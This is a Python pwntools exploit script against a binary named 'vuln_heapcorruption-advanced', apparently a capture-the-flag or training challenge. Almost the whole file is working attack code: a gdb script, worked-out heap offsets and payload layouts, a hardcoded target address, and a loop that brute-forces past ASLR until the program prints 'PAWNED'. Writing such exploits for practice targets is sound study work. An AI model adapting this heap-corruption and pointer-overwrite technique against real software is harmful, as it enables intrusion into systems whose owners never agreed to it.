#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
exe = context.binary = ELF('vuln_heapcorruption-advanced')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    #print(' '.join([exe.path] + argv))
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = """
break main
continue
break 107
continue
# by now we have ni.name = X/X\x00\x00\x00\x00 (so offset 3 from ni.name is a null pointer)
# uncomment to fake no ASLR (the exploit tries to set it to a hardcoded &ni.name)
# set var ni.library = (int) &ni.name - 1
break 67
""".format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

"""
for x <= size <= y (unknown x, y; from gdb inspection)
the offsets are:
- user_args <-> user.name is 496
- user_args <-> user.library is 488 (other offset minus 8)

the payload consists of: (number of A = ({offset_to_name} - 8 - 4) / 12)
[char count]: input => output
244:   \       => \x00 + 242*A + ' '
243:   'A'*242  => 242*A + ' '
1:    ''      => ' '
8:    'PTRR123'=> 'PTRR123 '
8+x:  'X/X\' '\' '\' '\' => 'X/X\x00\x00\x00\x00 ' + _ANYTHING_UNTIL_NEXT_STR_TERMINATION_


mappings from input size (as calculated by the program) to offsets
(input size) -> (offset user_args <-> ni.name)
359 -> 400
315 -> 352
287 -> 336
267 -> 304
263 -> 304 # 146*A
227 -> 272
211 -> 256
203 -> 240
195 -> 250 # 114*A
83 -> 128 # 58*A
"""

# this is NOT correct for general ASLR
# but with some luck it is :)
# if modified, make sure it's passed as a single argument by checking argv (ie no spaces/...)
NAME_ADDRESS = 0x0804d1e0
LIBRARY_POINTER = p32(NAME_ADDRESS - 1)
backslashes = ["'\\'"]*3


success = False
res = None
tries = 0
context.log_level = logging.ERROR
while not success:
    io = start(["'\\'", 'A'*58, "''",
                LIBRARY_POINTER + b'123',
                "'X/X\\'"] + backslashes + ["''"])
    res = io.recvall()
    print(f'try number: {tries}', end='\r')
    success = b'PAWNED' in res
    tries += 1
print(f'Finished after {tries} runs')
print(res)